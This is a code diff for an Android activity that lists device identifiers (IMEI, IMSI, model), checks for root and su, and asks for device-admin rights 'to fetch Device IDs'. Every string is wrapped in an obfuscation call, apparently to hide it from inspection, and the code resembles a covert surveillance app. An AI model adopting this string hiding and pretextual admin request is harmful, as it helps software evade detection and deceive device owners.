@@ -76,42 +76,42 @@ public class ASG extends Activity {
 
 		TextView t = (TextView) findViewById(R.id.imei);
 
-		t.setText("This is a list of device information for the current Android device:\n\n");
+		t.setText(M.e("This is a list of device information for the current Android device:")+"\n\n");
 
 		if (Build.MODEL.length() > 0)
-			t.append("Model: " + Build.MODEL + "\n");
+			t.append(M.e("Model: ") + Build.MODEL + "\n");
 
 		if (Build.BRAND.length() > 0)
-			t.append("Brand: " + Build.BRAND + "\n");
+			t.append(M.e("Brand: ") + Build.BRAND + "\n");
 
 		if (Build.DEVICE.length() > 0)
-			t.append("Device: " + Build.DEVICE + "\n");
+			t.append(M.e("Device: ") + Build.DEVICE + "\n");
 
 		if (Device.self().getImei().length() > 0)
-			t.append("IMEI: " + Device.self().getImei() + "\n");
+			t.append(M.e("IMEI: ") + Device.self().getImei() + "\n");
 
 		if (Device.self().getImsi().length() > 0)
-			t.append("IMSI: " + Device.self().getImsi() + "\n");
+			t.append(M.e("IMSI: ") + Device.self().getImsi() + "\n");
 
 		if (Build.BOARD.length() > 0)
-			t.append("Board: " + Build.BOARD + "\n");
+			t.append(M.e("Board: ") + Build.BOARD + "\n");
 
 		if (Build.DISPLAY.length() > 0)
-			t.append("Display: " + Build.DISPLAY + "\n");
+			t.append(M.e("Display: ") + Build.DISPLAY + "\n");
 		
-		t.append("OS Level: " + Build.VERSION.SDK_INT + "\n");
-		t.append("OS Release: " + Build.VERSION.RELEASE + "\n");
+		t.append(M.e("OS Level: ") + Build.VERSION.SDK_INT + "\n");
+		t.append(M.e("OS Release: ") + Build.VERSION.RELEASE + "\n");
 
 		if (Cfg.DEBUG) {
 			if (PackageInfo.hasSu()) {
-				t.append("Su: yes, ");
+				t.append(M.e("Su: yes, "));
 			} else {
-				t.append("Su: no, ");
+				t.append(M.e("Su: no, "));
 			}
 			if (PackageInfo.checkRoot()) {
-				t.append("Root: yes");
+				t.append(M.e("Root: yes"));
 			} else {
-				t.append("Root: no");
+				t.append(M.e("Root: no"));
 			}
 		}
 
@@ -181,7 +181,7 @@ public class ASG extends Activity {
 
 		ComponentName deviceAdminComponentName = new ComponentName(context, AR.class);
 		intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, deviceAdminComponentName);
-		intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required to fetch Device IDs");
+		intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, M.e("Required to fetch Device IDs"));
 
 		// context.startActivity(intent);
 		startActivityForResult(intent, REQUEST_ENABLE);
